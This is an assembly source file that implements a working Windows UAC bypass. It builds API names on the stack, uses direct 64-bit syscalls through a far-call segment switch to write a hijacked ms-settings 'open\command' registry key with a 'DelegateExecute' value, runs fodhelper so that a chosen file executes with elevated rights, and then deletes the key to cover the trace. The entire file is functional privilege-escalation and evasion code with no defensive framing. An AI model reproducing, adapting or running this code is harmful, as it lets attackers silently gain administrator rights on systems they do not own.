global _uac_bypass

; uac_bypass(PCHAR file_to_execute, HMODULE kernel32_dll, PROCEDURE kernel32_getprocaddress, SYSCALLINDEX ntcreatekey, SYSCALLINDEX ntsetvaluekey)

section .text

_uac_bypass:
    push ebp
    push esi
    push edi
    push ebx
    mov ebp, esp

    mov esi, [ebp + 0x24]
    mov edi, [ebp + 0x20]
    mov edx, [ebp + 0x1c]
    mov ecx, [ebp + 0x18]
    mov eax, [ebp + 0x14]

    call uac_bypass4

    mov esp, ebp
    pop ebx
    pop edi
    pop esi
    pop ebp
    ret

uac_bypass4:

    push ebp
    mov ebp, esp
    push eax

    push edx
    push ecx
    push edi
    push esi

    push 0x00000000
    push 0x32336970
    push 0x61766441
    push 0x00000000
    push 0x41797261
    push 0x7262694c
    push 0x64616f4c
    push esp
    push ecx
    call edx
    add esp, 0x10
    push esp
    call eax
    mov [ebp - 0x18], eax
    call .delta
.delta:
    jmp .skip
    db "\REGISTRY\USER\Software\Classes\ms-settings\Shell\open\command\"
    db 0
.skip:
    pop esi
    sub esp, 0x280
    mov edi, esp
    add esi, 0x2
    xor ecx, ecx
    mov byte cl, 0xe
    call mbstowcs

    mov edx, [ebp - 0x8]
    mov ecx, [ebp - 0x18]

    call acquire_sid
    mov esi, eax
    add edi, 0x1e

    push eax

    push 0x0
    push 0x416e656c
    push 0x7274736c

    mov ebx, esp
    mov edx, [ebp - 0x8]
    mov ecx, [ebp - 0xc]

    push ebx
    push ecx
    call edx

    add esp, 0xc
    call eax
    mov ecx, eax
    push ecx
    call mbstowcs

    pop ecx
    call .delta2
.delta2:    
    pop ebx
    lea esi, [ebx - 0x83]
    lea edi, [edi + ecx*2]

    push ecx
    xor ecx, ecx
    mov byte cl, 0x31
    call mbstowcs

    pop ecx
    mov eax, esp
    add ecx, 0x3f
    shl ecx, 0x1
    call .delta3

.delta3:
    pop ebx
    add ebx, 0x57
    and esp, 0xfffffff8
    push 0x0                                 ; push dummy value for alignment
    push ecx
    mov edx, [ebp - 0x8]
    mov ecx, [ebp - 0xc]
    push ecx
    push edx
    mov edx, [ebp - 0x10]
    mov ecx, [ebp - 0x14]
    push ecx
    push edx
    push 0x33
    push ebx
    mov ebx, [ebp - 0x4]
    call far [esp]

    test eax, eax
    je sid_error
    xchg edi, eax

    mov ecx, 0x500000                       ; this seems useless yes
timer3:                                     ; but for some reason i would get an access violation on the mov edx, [ebp - 0x8]
    test ecx, ecx                           ; this fixes it for some reason
    je timerend3
    dec ecx
    jmp timer3
timerend3:  

    mov edx, [ebp - 0x8]
    mov ecx, [ebp - 0xc]

    push 0x23
    call execute_fodhelper

    mov ecx, 0xffffffff                     ; fodhelper doesnt load instantly so i need this, kernel32!sleep also works
timer2:
    test ecx, ecx
    je timerend2
    dec ecx
    jmp timer2
timerend2:  
    xchg edi, eax
    call cleanup_reg

sid_error:
    mov esp, ebp
    pop ebp
    ret

[BITS 64]

    push rbp
    mov rbp, rsp
    push rbx
    sub esp, 0x10

    mov ecx, dword [rbp + 0x28]

[BITS 32]

    push eax
    push 0x0

    mov word [esp + 0x2], cx
    sub ecx, 0x24
    mov word [esp], cx
    mov edi, esp

[BITS 64]

    push 0
    push 0
    push 0x40
    push rdi
    push 0
    push 0x30

    mov eax, [ebp + 0x18]
    mov r8, rsp
    mov rbx, r8
    push 0
    push 0
    mov r10, rsp
    xor r9d, r9d
    mov edx, dword 0xF003F

    push 0x0
    push 0x0
    push 0x0
    sub rsp, 0x28
    
    syscall

    add byte [edi], 0xc
    call setup_reg_syscall
    syscall

    add byte [edi], 0xa
    call setup_reg_syscall
    syscall

    add byte [edi], 0xe
    call setup_reg_syscall
    syscall

    mov eax, [rsp + 0x40]
    mov ebx, [rsp + 0x48]

    mov [rbp - 0x18], rax
    mov [rbp - 0x10], rbx

    call .delta4
.delta4:
    jmp .skip2
    db "DelegateExecute"
    db 0
.skip2:
    pop rsi
    add rsi, 0x2
    xchg rdx, rdi
    mov rdi, [rdx + 0x8]
    xor ecx, ecx
    mov cl, 0x10

    call mbstowcs_64
    lea r9, [rcx + 2]
    mov r10, rbx

    mov eax, [ebp + 0x1c]
    xor r8d, r8d
    mov [rdx], word 0x20

    syscall

    mov rsi, [rbp - 0x8]
    call sstrlen
    push rcx
    call mbstowcs_64
    pop rcx
    lea ecx, [2 * ecx - 2]
    mov ebx, edi
    add edi, ecx

    mov [edi], byte 0x20
    add rdi, 0x2

    call .delta5
.delta5:
    jmp .skip3
    db "-ARGUMENT0"
    db 0
.skip3:
    pop rsi
    add rsi, 0x2

    call sstrlen
    call mbstowcs_64
    mov esi, ebx
    call lstrlen
    mov [rsp + 0x30], rcx
    mov [rsp + 0x28], rsi

    mov eax, [ebp + 0x1c]

    xor r8d, r8d
    lea r9, [r8 + 1]
    lea rdx, [rbp - 0x38]

    mov r10, [rbp - 0x10]

    syscall

    mov eax, dword [rbp - 0x18]

    mov rsp, rbp
    pop rbp
    retf

setup_reg_syscall:
    mov eax, [ebp + 0x18]
    lea r10, [rsp + 0x50]
    lea r8, [rsp + 0x58]
    xor r9d, r9d
    mov edx, dword 0xF003F
    ret

[BITS 64]
mbstowcs_64:
    xor eax, eax
.looper:
    mov al, byte [esi + ecx]
    mov [edi + ecx * 2], word ax
    dec ecx
    test cx, cx
    jge .looper
    lea eax, [edi]
    ret

lstrlen:
    xor ecx, ecx
.looper:
    mov ax, word [esi + ecx*2]
    test ax, ax
    je .terminal
    inc ecx
    jmp .looper
.terminal:
    shl ecx, 0x1
    ret

sstrlen:
    xor ecx, ecx
.looper:
    mov al, byte [esi + ecx]
    test al, al
    je .terminal
    inc ecx
    jmp .looper
.terminal:
    inc ecx
    ret

[BITS 32]

mbstowcs:
    xor eax, eax
.looper:
    mov al, byte [esi + ecx]
    mov [edi + ecx * 2], word ax
    dec ecx
    test cx, cx
    jge .looper
    lea eax, [edi]
    ret

;wcstombs:
    ;xor eax, eax
;.looper:
    ;mov ax, word [esi + ecx * 2]
    ;mov [edi + ecx], byte al
    ;dec ecx
    ;test cx, cx
    ;jge .looper
    ;lea eax, [edi]
    ;ret

cleanup_reg:

    push 0
    push eax

    push 0x00004165
    push 0x65725465
    push 0x74656c65
    push 0x44676552

    mov edx, [ebp - 0x8]
    mov ecx, [ebp - 0xc]

    push esp
    push ecx

    call edx

    add esp, 0x10

    call eax
    ret

execute_fodhelper:

    push 0x00636578
    push 0x456e6957

    push esp
    push ecx

    call edx
    jmp .skip
    db "sysnative\cmd /c fodhelper"
    db 0x0
.skip:
    call .delta6 
.delta6:
    pop ebx
    sub ebx, 0x20
    push 0x0
    push ebx
    call eax
    add esp, 0x8

    ;mov cx, 0x1300
timer:
    ;test cx, cx
    ;je timerend
    ;dec cx
    ;jmp timer
timerend:

    retf

acquire_sid:
    push ebp
    mov ebp, esp
    push edx
    push ecx
    
    push 0x006e6f69
    push 0x74616d72
    push 0x6f666e49
    push 0x6e656b6f
    push 0x54746547

    push esp
    push ecx

    call [ebp - 0x4]

    sub esp, 0x2c
    mov ecx, esp
    lea edx, [ebp - 0xc]
    push edx
    push 0x2c
    push ecx
    push 0x1
    push 0xfffffffc

    call eax

    test eax, eax
    je ground_proc

    push 0x00004164
    push 0x6953676e
    push 0x69727453
    push 0x6f546469
    push 0x53747265
    push 0x766e6f43

    push esp
    mov eax, [ebp - 0x8]
    push eax

    call [ebp - 0x4]

    add esp, 0x14
    push esp
    mov edx, [esp + 0x8]
    push edx
    call eax

    test eax, eax
    je ground_proc
    
    pop eax
    mov esp, ebp
    pop ebp
    ret

ground_proc:
    mov eax, cr0            ; crashes the program, bc exiting gracefully is effort
    retf
